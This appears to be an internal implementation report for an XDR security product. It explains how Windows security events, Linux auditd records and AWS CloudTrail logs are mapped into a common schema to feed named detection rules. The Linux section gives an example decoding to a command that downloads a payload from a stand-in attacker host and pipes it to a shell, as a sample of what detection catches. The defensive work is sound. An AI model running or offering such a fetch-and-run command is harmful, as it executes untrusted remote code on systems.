# NivXRay XDR — Phase 2 Telemetry Normalization Report
**Document Version:** 1.0.0  
**Phase:** Phase 2A & 2D Telemetry Foundation  
**Status:** IMPLEMENTED & AUDITED  
**Governing Principle:** `NO EVIDENCE → NO CLAIM` · `ZERO INVENTED FIELDS`  

---

## 1. Executive Summary

Phase 2A and 2D expanded the NivXRay XDR telemetry ingestion foundation beyond network IDS (Snort/Suricata) to encompass the three highest-priority enterprise data sources:
1. **Windows Security Event Log (EIDs 4688, 4768, 4769)**
2. **Linux Auditd (Syscall, Execve, Proctitle)**
3. **AWS CloudTrail (Management & Data API Events)**

Every normalized event is mapped into the strongly-typed [`CanonicalTelemetryEvent`](file:///d:/Projects/backend/detection_content/telemetry/models.py) model and persisted into the Single Source of Truth (`xdr_canonical_evidence`). 

### Mandatory Dimension Preservation Audit:
- ✅ **Tenant**: Explicitly scoped via `tenant_id` header / parameter (defaults to tenant context).
- ✅ **Source**: Preserves `source_vendor`, `source_product`, and `source_type`.
- ✅ **Source Event ID**: Preserves exact upstream event ID (`4688`, `4768`, `4769`, `syscall/audit_id`, `eventID`).
- ✅ **Event Time vs Ingest Time**: Strict separation between `event_time` (source timestamp) and `ingest_time` (arrival time).
- ✅ **Host / Device**: Hostname, host ID, domain, and OS family (`windows`, `linux`, `cloud`).
- ✅ **User / Identity**: Principal ID, username, domain, user SID, logon ID, privilege flag, and service principal ID.
- ✅ **Process & Command Line**: Executable path, basename, command line, parent process, PID, PPID, and integrity level.
- ✅ **Network**: Source IP, source port, destination IP, destination port, protocol, and direction.
- ✅ **Authentication**: Auth type (`kerberos_as_rep`, `kerberos_tgs_request`), service name (SPN), status, failure code, ticket options, ticket encryption type (`0x17` RC4, `0x12` AES-256).
- ✅ **Cloud Context**: Provider (`aws`), account ID, region, service, action (`eventName`), principal ARN, and resources.
- ✅ **Raw Evidence Reference**: Complete, unmodified raw event preserved in `raw_ref`.
- ✅ **Cryptographic Provenance**: Trace ID, collector ID, integration ID, DSM ID, parser ID, and normalizer ID.
- ✅ **Zero Invented Fields**: If an upstream event lacks a field, it remains `None` or empty; fields are never synthesized.

---

## 2. Windows Security Event Log DSM (`windows-security-evd`)

Implemented in [`backend/detection_content/telemetry/windows_security_dsm.py`](file:///d:/Projects/backend/detection_content/telemetry/windows_security_dsm.py).

### A. Event ID 4688 — Process Creation
- **Telemetry Ingested**:
  - `NewProcessName` $\longrightarrow$ `process.executable_path` and `process.name` (basename).
  - `CommandLine` / `ProcessCommandLine` $\longrightarrow$ `process.command_line`.
  - `ParentProcessName` $\longrightarrow$ `process.parent_name`.
  - `SubjectUserName` / `TargetUserName` $\longrightarrow$ `identity.username` and `identity.principal_id`.
  - `SubjectDomainName` $\longrightarrow$ `identity.domain`.
  - `SubjectUserSid` $\longrightarrow$ `identity.user_sid`.
  - `TokenElevationType` $\longrightarrow$ Evaluated to determine `identity.is_privileged = True` (e.g. `%%1937` / `TokenElevationTypeFull`).
- **Detection Enablement**:
  - Directly feeds rules `DET-EX-001` (Encoded PowerShell), `DET-EX-002` (Certutil), `DET-EX-003` (Bitsadmin), `DET-EX-004` (WMI), `DET-EX-005` (Regsvr32), `DET-DE-001` (Defender Kill), `DET-DE-002` (Wevtutil), `DET-CR-001` (LSASS Dump), `DET-IM-001` (VSS Shadow Deletion).

### B. Event ID 4768 — Kerberos TGT / Authentication Ticket Request
- **Telemetry Ingested**:
  - `TargetUserName` $\longrightarrow$ `identity.username` and `identity.principal_id`.
  - `ServiceName` $\longrightarrow$ `authentication.service_name` (e.g. `krbtgt`).
  - `TicketOptions` $\longrightarrow$ `authentication.ticket_options`.
  - `TicketEncryptionType` $\longrightarrow$ `authentication.ticket_encryption` (identifies weak RC4 `0x17` ciphers).
  - `Status` $\longrightarrow$ `authentication.status` (`SUCCESS` for `0x0`, `FAILURE` otherwise).
  - `IpAddress` $\longrightarrow$ `network.src_ip` (strips `::ffff:` IPv4-mapped IPv6 prefixes).
  - `IpPort` $\longrightarrow$ `network.src_port`.
- **Detection Enablement**:
  - Directly feeds rule `DET-CR-005` (AS-REP Roasting without Pre-Authentication).

### C. Event ID 4769 — Kerberos Service Ticket (TGS) Request
- **Telemetry Ingested**:
  - `TargetUserName` $\longrightarrow$ `identity.username`.
  - `ServiceName` $\longrightarrow$ `authentication.service_name` (Target Service Principal Name / SPN, e.g. `MSSQLSvc/db01.corp.local:1433`).
  - `TicketEncryptionType` $\longrightarrow$ `authentication.ticket_encryption` (identifies RC4 `0x17` requests against high-value service accounts).
  - `IpAddress` and `IpPort` $\longrightarrow$ `network.src_ip` and `network.src_port`.
- **Detection Enablement**:
  - Directly feeds rule `DET-CR-004` (Kerberoasting SPN Ticket Request) and scenario `CORR-ENT-005`.

---

## 3. Linux Auditd DSM (`linux-auditd`)

Implemented in [`backend/detection_content/telemetry/linux_auditd_dsm.py`](file:///d:/Projects/backend/detection_content/telemetry/linux_auditd_dsm.py).

### Key Architectural Highlights:
1. **Deterministic Hex Unhexing**:
   - Linux auditd hex-encodes arguments and commands containing spaces, quotes, or special characters.
   - `_unhex_if_needed()` deterministically decodes hex strings (e.g. `6375726C20...` $\longrightarrow$ `curl -s http://evil.com/payload | bash`) while replacing null byte delimiters (`\x00`) with spaces.
2. **Process Lineage Assembly**:
   - Reconstructs argument lists (`a0`, `a1`, `a2`, ...) into complete `process.command_line`.
   - Resolves executable binary (`exe`), process communication title (`comm`), process ID (`pid`), and parent process ID (`ppid`).
3. **Privilege & Identity Resolution**:
   - Maps `uid`, `euid`, and `auid` (Audit User ID).
   - Resolves `root` privilege if any of `uid`, `euid`, or `auid` equals `0`.
- **Detection Enablement**:
  - Directly feeds rule `DET-EX-006` (Linux Pipe to Shell Execution).

---

## 4. AWS CloudTrail DSM (`aws-cloudtrail`)

Implemented in [`backend/detection_content/telemetry/aws_cloudtrail_dsm.py`](file:///d:/Projects/backend/detection_content/telemetry/aws_cloudtrail_dsm.py).

### Key Architectural Highlights:
1. **Multi-Format Ingestion**:
   - Supports direct CloudTrail log records and AWS EventBridge CloudTrail event wrappers (`detail` unwrapping).
2. **User Identity Normalization**:
   - Handles `IAMUser`, `AssumedRole`, `Root`, `FederatedUser`, `AWSService`, and `ServicePrincipal`.
   - Extracts ARN, session issuer, account ID, and principal ID into `identity.principal_id`.
   - Flags `is_privileged = True` for `Root` or admin roles.
3. **Cloud Context Isolation**:
   - Populates `cloud.provider = "aws"`, `cloud.account_id`, `cloud.region`, `cloud.service` (e.g. `iam`, `sts`, `s3`), `cloud.action` (`eventName`), and `cloud.resource_ids`.
4. **Network Context**:
   - Maps `sourceIPAddress` to `network.src_ip` while filtering out AWS internal endpoints (`*.amazonaws.com`).
- **Detection Enablement**:
  - Directly feeds rules `DET-PE-003` (Cloud IAM Policy Escalation), `DET-CR-006` (Cloud IMDS Credential Theft), and `DET-EM-001` (Service Principal Abuse).

---

## 5. Pipeline Registration & Integration

In [`backend/detection_content/xdr_pipeline.py`](file:///d:/Projects/backend/detection_content/xdr_pipeline.py#L51-L65):
```python
class DSMRegistry:
    def __init__(self):
        self._dsms: list = [SnortEveDSM()]
        try:
            from .telemetry import WindowsSecurityDSM, LinuxAuditdDSM, AWSCloudTrailDSM
            self._dsms.extend([WindowsSecurityDSM(), LinuxAuditdDSM(), AWSCloudTrailDSM()])
        except Exception:
            pass
```
Incoming events in `process_event(raw_event)` resolve their appropriate DSM dynamically via `DSM_REGISTRY.resolve(raw_event)`, parsing and normalizing them into the canonical schema before dispatching detection evaluation.

---
*End of Phase 2 Telemetry Normalization Report.*
